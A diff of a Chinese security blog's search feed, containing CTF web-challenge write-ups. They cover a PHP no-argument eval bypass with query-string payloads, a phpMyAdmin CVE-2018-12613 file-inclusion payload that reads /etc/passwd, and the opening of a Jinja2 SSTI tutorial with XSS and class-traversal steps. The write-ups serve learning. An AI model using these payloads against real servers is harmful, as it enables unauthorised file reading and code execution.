echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h1 id="解题">解题</h1>
-<p>第一个 <code>if</code> 过滤了一些伪协议；</p>
-<p>第二个 <code>if</code> 比较难，第一次遇见，这是过滤了函数的参数。<code>?(R)?</code> 是递归匹配模式的意思。匹配到的字符串都会被空代替，最后还需要满足强对比。所以，我们传入的exp在最后得有 <code>;</code> ，并且前面的部分都要被匹配，从而只剩下 <code>;</code>。</p>
-<p>详细解释一下第二个匹配模式：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[a-z,_]+\((?R)?\)可以分为以下4个部分：</span><br><span class="line">1. [a-z,_]  </span><br><span class="line">2. \(   </span><br><span class="line">3. (?R)?   </span><br><span class="line">4. \)</span><br></pre></td></tr></table></figure>
-<p>假设输入的为 <code>print_r(scandir());</code>。这句话就是扫描某目录（此时目录并未指定），然后把目录下的所有文件名or子目录名形成一个数组返回并打印出来。</p>
-<table>
-<thead>
-<tr class="header">
-<th style="text-align: center;">过程</th>
-<th style="text-align: center;">被匹配的部分</th>
-<th style="text-align: center;">备注</th>
-<th style="text-align: center;">递归层数</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td style="text-align: center;">1</td>
-<td style="text-align: center;">print_r</td>
-<td style="text-align: center;"><code>[a-z,_]</code> 起作用</td>
-<td style="text-align: center;">0</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;">2</td>
-<td style="text-align: center;">print_r(</td>
-<td style="text-align: center;"><code>\(</code> 起作用</td>
-<td style="text-align: center;">0</td>
-</tr>
-<tr class="odd">
-<td style="text-align: center;">3</td>
-<td style="text-align: center;">print_r(scandir</td>
-<td style="text-align: center;"><code>(?R)?</code> 起作用，进入递归，再次匹配<code>[a-z,_]</code></td>
-<td style="text-align: center;">1</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;">4</td>
-<td style="text-align: center;">print_r(scandir(</td>
-<td style="text-align: center;"><code>\(</code> 再次起作用</td>
-<td style="text-align: center;">1</td>
-</tr>
-<tr class="odd">
-<td style="text-align: center;">5</td>
-<td style="text-align: center;">print_r(scandir()</td>
-<td style="text-align: center;">进入第一个递归之后的 <code>\)</code> 起作用<br>执行之后退出第一次递归</td>
-<td style="text-align: center;">执行时属于：1<br>执行结束后退出第一层递归：0</td>
-</tr>
-<tr class="even">
-<td style="text-align: center;">6</td>
-<td style="text-align: center;">print_r(scandir())</td>
-<td style="text-align: center;"><code>\)</code> 起作用</td>
-<td style="text-align: center;">0</td>
-</tr>
-</tbody>
-</table>
-<p>最后剩下一个 <code>;</code> 成功匹配。如果带有参数，比如：<code>print_r(scandir('/'));</code>，到第4步为止都是一样的，第5步的时候因为此时应该匹配的是 <code>\)</code> ，但是，此时字符串的位置是 <code>'/')</code> 无法成功匹配，返回原来的字符串，从而无法绕过第二个 <code>if</code>。</p>
-<p>成功绕过演示：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324200901.png" /></p>
-<p>失败演示：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324200923.png" /></p>
-<p>第三个 <code>if</code> 也比较简单，只是过滤了一些敏感词。</p>
-<p>接下来就要做两件事：</p>
-<ol type="1">
-<li><p>找 flag 所在的路径，一般在当前目录或者根目录</p></li>
-<li><p>找到了该怎么把路径表示出来，此时不能传入参数</p></li>
-</ol>
-<p>接下来需要对 PHP 比较了解的人能够想得到（反正我个菜鸟没有想到），先介绍几个函数：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. localeconv(): 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line"><span class="number">2</span>. scandir(): 列出给定目录中的文件和目录。</span><br><span class="line"><span class="number">3</span>. readfile(): 输出一个文件。本题中，如果使用该函数输出flag，需要在源码中查看</span><br><span class="line"><span class="number">4</span>. current(): 返回数组中的当前单元, 默认取第一个值。</span><br><span class="line"><span class="number">5</span>. pos(): current() 的别名。</span><br><span class="line"><span class="number">6</span>. next(): 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line"><span class="number">7</span>. array_reverse(): 以相反的元素顺序返回数组。</span><br><span class="line"><span class="number">8</span>. highlight_file(): 打印输出或者返回 filename 文件中语法高亮版本的代码。</span><br><span class="line"><span class="number">9</span>. array_flip(): 将数组的键和值互换</span><br><span class="line"><span class="number">10</span>. array_rand(): 随机读取数组中的一个或多个单元</span><br></pre></td></tr></table></figure>
-<p>以上最难理解的就是 <code>localeconv()</code>，但是这又是最关键的，因为不能传入参数，所以得想方设法找到路径 <code>/</code> 和 <code>.</code> ，而该函数就能够找到后者。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324200955.png" /></p>
-<p>注意上图中的箭头处，那是 <code>.</code> 。因此，我们只要将它取出来即可，这时候就需要用到<code>current()</code> 了。然后再配合上 <code>scandir()</code> 和 <code>print_r</code> 就可以得到当前目录下的信息。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
-<p>返回结果：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201026.png" /></p>
-<p>注意到 <code>flag.php</code> 在第4个，或者说是倒数第2个。此时有两种方法：</p>
-<p>第一种，将整个数组反转，然后用 next() 取反转后的第二个元素，即 flag.php。payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201059.png" /></p>
-<p>第二种比较看运气，利用 <code>array_flip()</code> 将交换数组的键和值</p>
-<p><code>?exp=print_r(array_flip(scandir(current(localeconv()))));</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201121.png" /></p>
-<p>然后利用 <code>array_rand(array_flip())</code> 将数组的键<strong>随机</strong>的读取</p>
-<p><code>?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201131.png" /></p>
-<p>最终的 payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
-<p>由于随机性，所以需要多刷新几次。</p>
-<h1 id="总结">总结</h1>
-<p>由于对 PHP 代码的不熟悉，导致本题最多只能做到代码审计这一步。得挑个时候学学 PHP 了，跑不掉的呀。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>git泄露</tag>
-        <tag>RCE</tag>
       </tags>
   </entry>
   <entry>
@@ -647,45 +584,108 @@
       </tags>
   </entry>
   <entry>
-    <title>GWCTF 2019 我有一个数据库</title>
-    <url>/2022/03/24/GWCTF%202019%20%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
+    <title>GXYCTF2019 禁止套娃</title>
+    <url>/2022/03/24/GXYCTF2019%20%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/</url>
     <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
 <span id="more"></span>
 <h1 id="题目信息">题目信息</h1>
-<p>进入环境之后，不论是数据包还是页面源码，什么信息都没有，只有如下看不懂的字</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204732.png" /></p>
-<p>因此，决定扫描目录，结果如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204816.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204824.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204843.png" /></p>
-<p>将所有都访问一次，发现只有 <code>/phpmyadmin</code> 有用，界面如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204938.png" /></p>
+<p>进入环境之后发现什么信息都没有，数据包和源码都没有有用的信息。因此尝试扫描目录。但是我没有扫描出什么结果，可能是脚本不够强大吧。所以我又则疼了一会终于百度了以下，发现存在 <code>git</code> 泄露，因此使用 <code>githack</code> 下载。下载得到源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h1 id="解题">解题</h1>
-<p>通过该页面发现：</p>
+<p>第一个 <code>if</code> 过滤了一些伪协议；</p>
+<p>第二个 <code>if</code> 比较难，第一次遇见，这是过滤了函数的参数。<code>?(R)?</code> 是递归匹配模式的意思。匹配到的字符串都会被空代替，最后还需要满足强对比。所以，我们传入的exp在最后得有 <code>;</code> ，并且前面的部分都要被匹配，从而只剩下 <code>;</code>。</p>
+<p>详细解释一下第二个匹配模式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[a-z,_]+\((?R)?\)可以分为以下4个部分：</span><br><span class="line">1. [a-z,_]  </span><br><span class="line">2. \(   </span><br><span class="line">3. (?R)?   </span><br><span class="line">4. \)</span><br></pre></td></tr></table></figure>
+<p>假设输入的为 <code>print_r(scandir());</code>。这句话就是扫描某目录（此时目录并未指定），然后把目录下的所有文件名or子目录名形成一个数组返回并打印出来。</p>
+<table>
+<thead>
+<tr class="header">
+<th style="text-align: center;">过程</th>
+<th style="text-align: center;">被匹配的部分</th>
+<th style="text-align: center;">备注</th>
+<th style="text-align: center;">递归层数</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;">1</td>
+<td style="text-align: center;">print_r</td>
+<td style="text-align: center;"><code>[a-z,_]</code> 起作用</td>
+<td style="text-align: center;">0</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">2</td>
+<td style="text-align: center;">print_r(</td>
+<td style="text-align: center;"><code>\(</code> 起作用</td>
+<td style="text-align: center;">0</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">3</td>
+<td style="text-align: center;">print_r(scandir</td>
+<td style="text-align: center;"><code>(?R)?</code> 起作用，进入递归，再次匹配<code>[a-z,_]</code></td>
+<td style="text-align: center;">1</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">4</td>
+<td style="text-align: center;">print_r(scandir(</td>
+<td style="text-align: center;"><code>\(</code> 再次起作用</td>
+<td style="text-align: center;">1</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">5</td>
+<td style="text-align: center;">print_r(scandir()</td>
+<td style="text-align: center;">进入第一个递归之后的 <code>\)</code> 起作用<br>执行之后退出第一次递归</td>
+<td style="text-align: center;">执行时属于：1<br>执行结束后退出第一层递归：0</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">6</td>
+<td style="text-align: center;">print_r(scandir())</td>
+<td style="text-align: center;"><code>\)</code> 起作用</td>
+<td style="text-align: center;">0</td>
+</tr>
+</tbody>
+</table>
+<p>最后剩下一个 <code>;</code> 成功匹配。如果带有参数，比如：<code>print_r(scandir('/'));</code>，到第4步为止都是一样的，第5步的时候因为此时应该匹配的是 <code>\)</code> ，但是，此时字符串的位置是 <code>'/')</code> 无法成功匹配，返回原来的字符串，从而无法绕过第二个 <code>if</code>。</p>
+<p>成功绕过演示：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324200901.png" /></p>
+<p>失败演示：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324200923.png" /></p>
+<p>第三个 <code>if</code> 也比较简单，只是过滤了一些敏感词。</p>
+<p>接下来就要做两件事：</p>
 <ol type="1">
-<li><p>phpmyadmin 版本为 4.8.1</p></li>
-<li><p>服务器用的是 apache</p></li>
-<li><p>数据库是 mysql</p></li>
-<li><p>PHP版本信息为 7.2.24-0ubuntu0.18.04.1</p></li>
-<li><p>系统为 Ubuntu</p></li>
+<li><p>找 flag 所在的路径，一般在当前目录或者根目录</p></li>
+<li><p>找到了该怎么把路径表示出来，此时不能传入参数</p></li>
 </ol>
-<p>第一次碰到这种题目，有点懵逼，就去百度了一下 <code>phpmyadmin 4.8 漏洞</code> 发现了存在 <code>CVE-2018-12613</code> 远程文件包含漏洞。将找到的payload（这里要注意系统是Windows还是Linux）尝试一下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../etc/passwd # linux payload</span><br></pre></td></tr></table></figure>
-<p>结果：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205506.png" /></p>
-<p>发现确实存在漏洞，那么将 <code>/etc/passwd</code> 改为我们想要的文件路径即可。问题是这里我们不知道 flag 在哪，一般在根目录或者网站目录，这里只知道根目录，所以就尝试以下根目录，即</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure>
-<p>得到 flag</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205738.png" /></p>
+<p>接下来需要对 PHP 比较了解的人能够想得到（反正我个菜鸟没有想到），先介绍几个函数：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. localeconv(): 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line"><span class="number">2</span>. scandir(): 列出给定目录中的文件和目录。</span><br><span class="line"><span class="number">3</span>. readfile(): 输出一个文件。本题中，如果使用该函数输出flag，需要在源码中查看</span><br><span class="line"><span class="number">4</span>. current(): 返回数组中的当前单元, 默认取第一个值。</span><br><span class="line"><span class="number">5</span>. pos(): current() 的别名。</span><br><span class="line"><span class="number">6</span>. next(): 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line"><span class="number">7</span>. array_reverse(): 以相反的元素顺序返回数组。</span><br><span class="line"><span class="number">8</span>. highlight_file(): 打印输出或者返回 filename 文件中语法高亮版本的代码。</span><br><span class="line"><span class="number">9</span>. array_flip(): 将数组的键和值互换</span><br><span class="line"><span class="number">10</span>. array_rand(): 随机读取数组中的一个或多个单元</span><br></pre></td></tr></table></figure>
+<p>以上最难理解的就是 <code>localeconv()</code>，但是这又是最关键的，因为不能传入参数，所以得想方设法找到路径 <code>/</code> 和 <code>.</code> ，而该函数就能够找到后者。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324200955.png" /></p>
+<p>注意上图中的箭头处，那是 <code>.</code> 。因此，我们只要将它取出来即可，这时候就需要用到<code>current()</code> 了。然后再配合上 <code>scandir()</code> 和 <code>print_r</code> 就可以得到当前目录下的信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
+<p>返回结果：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201026.png" /></p>
+<p>注意到 <code>flag.php</code> 在第4个，或者说是倒数第2个。此时有两种方法：</p>
+<p>第一种，将整个数组反转，然后用 next() 取反转后的第二个元素，即 flag.php。payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201059.png" /></p>
+<p>第二种比较看运气，利用 <code>array_flip()</code> 将交换数组的键和值</p>
+<p><code>?exp=print_r(array_flip(scandir(current(localeconv()))));</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201121.png" /></p>
+<p>然后利用 <code>array_rand(array_flip())</code> 将数组的键<strong>随机</strong>的读取</p>
+<p><code>?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201131.png" /></p>
+<p>最终的 payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+<p>由于随机性，所以需要多刷新几次。</p>
 <h1 id="总结">总结</h1>
-<p>本题考的是平常的总结，以及对信息的敏感度。看到一些版本信息要想到是否存在该版本特有的信息，并且即使搜索。平常遇到这类的问题也要多积累。</p>
+<p>由于对 PHP 代码的不熟悉，导致本题最多只能做到代码审计这一步。得挑个时候学学 PHP 了，跑不掉的呀。</p>
 ]]></content>
       <categories>
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>phpmyadmin 漏洞</tag>
-        <tag>CVE-2018-12613</tag>
+        <tag>PHP</tag>
+        <tag>git泄露</tag>
+        <tag>RCE</tag>
       </tags>
   </entry>
   <entry>
@@ -734,13 +734,97 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat, tac, more, less, head, tail, nl, paste, od, bzmore, bzless</span><br></pre></td></tr></table></figure></p>
 <p>php文件读取函数：<br />
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">print_r() fread() fgets() var_dump()</span><br></pre></td></tr></table></figure></p>
-<p>例题：<a href="https://hdfzzf.icu/2022/04/05/bugku_聪明的PHP/">bugku_聪明的PHP</a></p>
+<h1 id="题目">题目</h1>
+<ol type="1">
+<li><a href="https://hdfzzf.icu/2022/04/05/bugku_聪明的PHP/">bugku_聪明的PHP</a></li>
+<li><a href="https://hdfzzf.icu/2022/03/22/BJDCTF2020%20The%20mystery%20of%20ip/">BJDCTF2020 The mystery of ip</a></li>
+</ol>
 ]]></content>
       <categories>
         <category>SSTI</category>
       </categories>
       <tags>
         <tag>Smarty</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Jinjia2+Flask模板注入</title>
+    <url>/2022/04/05/Jinjia2+Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p>记录一下关于Smarty模板注入的知识点以及相关的payload。</p>
+<span id="more"></span>
+<h1 id="基本原理">基本原理</h1>
+<p><strong>路由</strong>： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> flask </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello world&#x27;</span></span><br></pre></td></tr></table></figure></p>
+<p>route装饰器的作用：当访问http://ip:5000/index时，会自动调用<code>hello_world</code>函数。</p>
+<p><strong>渲染方法</strong>： flask的渲染方法有<code>render_template</code>和<code>render_template_string</code>两种。</p>
+<p>render_template是用来渲染一个<strong>指定的文件</strong>的。使用如下 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
+<p>而render_template_string则是用来渲染一个<strong>字符串</strong>的。SSTI与这个方法密不可分。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">html = <span class="string">&#x27;&lt;h1&gt;This is index page&lt;/h1&gt;&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template_string(html)</span><br></pre></td></tr></table></figure></p>
+<p><strong>flask是使用Jinja2来作为渲染引擎的</strong>。</p>
+<p>在网站的根目录下新建<code>templates</code>文件夹，这里是用来存放html文件。也就是模板文件。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test.py:</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,url_for,redirect,render_template,render_template_string</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_login</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/template/index.html:</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>This is index page<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>访问<code>127.0.0.1:5000/index/</code>的时候，flask就会渲染出index.html的页面。</p>
+<p>模板文件并不是单纯的html代码，而是<strong>夹杂着模板的语法</strong>，因为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法来传参。例子如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test.py：</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,url_for,redirect,render_template,render_template_string</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_login</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,content=<span class="string">&#x27;This is index page.&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/templates/index.html：</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;content&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个时候页面仍然输出<code>This is index page</code>。</p>
+<p><strong><code>&#123;&#123;&#125;&#125;</code>在Jinja2中作为变量包裹标识符。</strong></p>
+<h1 id="漏洞利用">漏洞利用</h1>
+<h2 id="xss利用">XSS利用</h2>
+<p>存在漏洞的代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    data = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    html = <span class="string">&#x27;&#x27;&#x27;&lt;h3&gt;%s&lt;/h3&gt; &#x27;&#x27;&#x27;</span> % (data)  <span class="comment"># 漏洞在这里</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br></pre></td></tr></table></figure></p>
+<p><strong>这段代码存在漏洞的原因是数据(data)和代码的混淆</strong>。代码中的<code>data</code>是用户可控的，会和html拼接后直接带入渲染。</p>
+<p>比如输入：<code>?id=&lt;script&gt;alert(1)&lt;/script&gt;</code>，则会弹出窗口。</p>
+<p>将代码改为如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@app.route(&#x27;/test/&#x27;)</span><br><span class="line">def test():</span><br><span class="line">    data = request.args.get(&#x27;id&#x27;)</span><br><span class="line">    return render_template_string(&#x27;&lt;h1&gt;&#123;&#123; data &#125;&#125;&lt;/h1&gt;&#x27;,data=data)</span><br></pre></td></tr></table></figure></p>
+<p>继续输入上述的payload，会发现<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>被输出，而不像之前那样弹出窗口。<strong>这是因为模板引擎一般都默认对渲染的变量值进行编码转义，这样就不会存在xss了。在这段代码中用户所控的是data变量，而不是模板内容。存在漏洞的代码中，模板内容直接受用户控制的。</strong></p>
+<p>模板注入并不局限于xss，它还可以进行其他攻击。</p>
+<h2 id="文件包含命令执行">文件包含/命令执行</h2>
+<p>题目地址：https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5422&amp;page=1</p>
+<p>（以上面的题目为例子说明）</p>
+<h3 id="基础知识">基础知识</h3>
+<p>在Jinja2模板引擎中，<code>&#123;&#123;&#125;&#125;</code>是变量包裹标识符。<code>&#123;&#123;&#125;&#125;</code>并不仅仅可以传递变量，还可以执行一些简单的表达式。</p>
+<p>这里还是用上文中存在漏洞的代码。构造payload：<code>&#123;&#123;7*4&#125;&#125;</code>，会返回49，也就是表达式被执行了，这里能判断存在SSTI。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405150525.png" /></p>
+<p>这里用<code>&#123;&#123;7*'7'&#125;&#125;</code>尝试一下，结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405150615.png" /></p>
+<p>因此，判断模板引擎为Jinjia2，上面也说明了，flask是使用Jinja2来作为渲染引擎的。</p>
+<h3 id="文件包含">文件包含</h3>
+<p>看了师傅们的文章，是通过python的对象的继承来一步步实现文件读取和命令执行的的。顺着师傅们的思路，再理一遍。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">找到父类`&lt;type &#x27;object&#x27;&gt;` -&gt; 寻找子类 -&gt; 找关于命令执行或者文件操作的模块。</span><br></pre></td></tr></table></figure></p>
+<p>几个魔术方法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__class__  <span class="comment"># 返回类型所属的对象</span></span><br><span class="line">__mro__    <span class="comment"># 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span></span><br><span class="line">__base__   <span class="comment"># 返回该对象所继承的基类   or __bases__</span></span><br><span class="line"><span class="comment"># __base__和__mro__都是用来寻找基类的</span></span><br><span class="line"></span><br><span class="line">__subclasses__   <span class="comment"># 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span></span><br><span class="line">__init__  <span class="comment"># 类的初始化方法，所有自带类都包含init方法</span></span><br><span class="line">function.__globals__  <span class="comment"># 用于获取function所处空间下可使用的module、方法以及所有变量</span></span><br></pre></td></tr></table></figure></p>
+<p>获取字符串的类对象： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__</span><br><span class="line">结果：&lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405151051.png" /></p>
